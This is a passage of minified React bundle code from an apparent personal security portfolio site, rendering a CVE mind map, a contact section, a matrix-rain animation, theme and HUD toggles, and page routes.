mindmap-shell",children:[y.jsxs("div",{className:"mode-icon-bar","aria-hidden":"true",children:[y.jsx("button",{className:`mode-icon ${e==="year"?"active":""}`,onClick:()=>n("year"),title:"Group by year",children:y.jsx("span",{className:"icon glyph-years"})}),y.jsx("button",{className:`mode-icon ${e==="severity"?"active":""}`,onClick:()=>n("severity"),title:"Group by severity",children:y.jsx("span",{className:"icon glyph-severity"})})]}),y.jsxs("div",{className:"mindmap-canvas",children:[y.jsx(Mw,{data:s,onSelectCve:x,onFocusPath:l,highlightId:b,onHover:p=>{var d,m;h((p==null?void 0:p.node)||null),p&&p.screen?v({name:p.node.name,title:((d=p.node.info)==null?void 0:d.title)||p.node.name,href:(m=p.node.info)==null?void 0:m.href,x:p.screen.x,y:p.screen.y}):v(null)},hoveredId:u==null?void 0:u.id},o),f&&y.jsxs("div",{className:"mindmap-preview",style:{left:f.x,top:f.y},children:[y.jsx("div",{className:"preview-title",children:f.title}),f.href?y.jsx("a",{href:f.href,target:"_blank",rel:"noreferrer",children:"open blog"}):null]})]})]}),y.jsx(ry,{cve:r,onClose:()=>i(null)})]})}function Dw(){const e="hemparekh1596@gmail.com",[n,t]=E.useState(!1),s=()=>{navigator.clipboard&&navigator.clipboard.writeText(e).then(()=>{t(!0),setTimeout(()=>t(!1),1800)}).catch(()=>{})};return y.jsx("section",{className:"contact-strip",id:"contact",children:y.jsxs("div",{className:"container contact-grid",children:[y.jsxs("div",{children:[y.jsx("p",{className:"pill",children:"Let’s talk"}),y.jsx("h2",{children:"Signal received. Drop a note and let’s build secure systems."}),y.jsx("p",{className:"contact-blurb",children:"Let’s connect to collaborate on security engineering or privacy-focused initiatives."}),n&&y.jsx("p",{className:"contact-blurb",children:"Copied. Channel armed with end-to-end noise."})]}),y.jsxs("div",{className:"contact-actions",children:[y.jsx("button",{className:"button primary",onClick:s,type:"button",children:"Copy Email"}),y.jsx("a",{className:"button ghost",href:"https://www.linkedin.com/in/hem-parekh/",target:"_blank",rel:"noreferrer",children:"LinkedIn"}),y.jsx("a",{className:"button ghost",href:"https://github.com/Hem1700",target:"_blank",rel:"noreferrer",children:"GitHub"})]})]})})}function jw(){const[e,n]=E.useState(0);return E.useEffect(()=>{const t=()=>{const{scrollTop:s,scrollHeight:r,clientHeight:i}=document.documentElement,a=r>i?s/(r-i)*100:0;n(Math.min(100,Math.max(0,a)))};return t(),window.addEventListener("scroll",t,{passive:!0}),()=>window.removeEventListener("scroll",t)},[]),y.jsx("div",{className:"scroll-progress",children:y.jsx("div",{className:"scroll-progress__bar",style:{width:`${e}%`}})})}function Bw(){const[e,n]=E.useState(!1);return E.useEffect(()=>{const t=()=>n(window.scrollY>400);return window.addEventListener("scroll",t,{passive:!0}),t(),()=>window.removeEventListener("scroll",t)},[]),e?y.jsx("button",{className:"back-to-top",type:"button","aria-label":"Back to top",title:"Back to top",onClick:()=>window.scrollTo({top:0,behavior:"smooth"}),children:"↑"}):null}function Fw(){const e=E.useRef(null),n=E.useRef(null);return E.useEffect(()=>{const t=e.current;if(!t)return()=>{};const s=t.getContext("2d");let r=t.width=window.innerWidth,i=t.height=window.innerHeight;const a=16;let l=Math.floor(r/a),o=Array.from({length:l},()=>({y:Math.random()*20,speed:.5+Math.random()*.9}));const c="アカサタナハマヤラワ0123456789日田由止育宇禾水火木金土文ﾊﾐﾋﾑﾍﾎｱｶｻﾀﾅﾊﾏ",u=()=>{s.fillStyle="rgba(0, 0, 0, 0.12)",s.fillRect(0,0,r,i),s.font=`${a}px "IBM Plex Mono", monospace`,o.forEach((f,v)=>{const b=c[Math.floor(Math.random()*c.length)],g=v*a,x=f.y*a;s.fillStyle="rgba(200, 200, 200, 0.9)",s.fillText(b,g,x),s.fillStyle="rgba(200, 200, 200, 0.18)",s.fillText(b,g,x-a),f.y+=f.speed,f.y*a>i&&Math.random()>.95&&(f.y=0,f.speed=.5+Math.random()*.9)}),n.current=requestAnimationFrame(u)},h=()=>{r=t.width=window.innerWidth,i=t.height=window.innerHeight,l=Math.floor(r/a),o=Array.from({length:l},()=>({y:Math.random()*20,speed:1+Math.random()*2}))};return window.addEventListener("resize",h),u(),()=>{window.removeEventListener("resize",h),n.current&&cancelAnimationFrame(n.current)}},[]),y.jsx("canvas",{ref:e,className:"matrix-rain","aria-hidden":"true"})}function Uw(){const[e,n]=E.useState(()=>typeof window>"u"?"light":localStorage.getItem("theme")||"light");return E.useEffect(()=>{const s=document.body;s.classList.remove("light","dark"),s.classList.add(e),localStorage.setItem("theme",e)},[e]),{theme:e,toggleTheme:()=>{n(s=>s==="light"?"dark":"light")}}}function Hw(){const{theme:e,toggleTheme:n}=Uw(),[t,s]=E.useState(!0),[r,i]=E.useState(!0),a=E.useCallback((o,c)=>{const u=document.body;u&&(o?u.classList.remove("hud-scanlines-off"):u.classList.add("hud-scanlines-off"),c?u.classList.remove("hud-noise-off"):u.classList.add("hud-noise-off"))},[]);E.useEffect(()=>{try{const o=localStorage.getItem("hud:scanlines")!=="off",c=localStorage.getItem("hud:noise")!=="off";s(o),i(c),a(o,c)}catch{a(!0,!0)}},[a]),E.useEffect(()=>{try{localStorage.setItem("hud:scanlines",t?"on":"off"),localStorage.setItem("hud:noise",r?"on":"off")}catch{}a(t,r)},[t,r,a]);const l=E.useCallback(()=>{if(typeof window<"u"){window.dispatchEvent(new CustomEvent("hud:reset-layout",{detail:"all"}));try{Object.keys(localStorage).filter(o=>o.startsWith("hud:window:")||o.startsWith("hud:")).forEach(o=>localStorage.removeItem(o))}catch{}}},[]);return E.useEffect(()=>{const o=c=>{if(!((c.ctrlKey||c.metaKey)&&c.shiftKey))return;const u=c.key.toLowerCase();u==="r"&&(c.preventDefault(),l()),u==="s"&&(c.preventDefault(),s(h=>!h)),u==="n"&&(c.preventDefault(),i(h=>!h))};return window.addEventListener("keydown",o),()=>window.removeEventListener("keydown",o)},[l]),y.jsx(Tg,{children:y.jsxs("div",{className:"app-shell",children:[y.jsx(Fw,{}),y.jsx(jw,{}),y.jsx(Lg,{onToggleTheme:n,theme:e}),y.jsx("main",{children:y.jsxs(wg,{children:[y.jsx(kn,{path:"/",element:y.jsx(Ic,{})}),y.jsx(kn,{path:"/blogs",element:y.jsx(Dg,{})}),y.jsx(kn,{path:"/projects",element:y.jsx(ty,{})}),y.jsx(kn,{path:"/certifications",element:y.jsx(sy,{})}),y.jsx(kn,{path:"/blog/:slug",element:y.jsx(ny,{})}),y.jsx(kn,{path:"/cve-map",element:y.jsx(zw,{})}),y.jsx(kn,{path:"*",element:y.jsx(Ic,{})})]})}),y.jsx(Dw,{}),y.jsx(Ng,{}),y.jsx(Bw,{})]})})}hd(document.getElementById("root")).render(y.jsx(uu.StrictMode,{children:y.jsx(Hw,{})}));
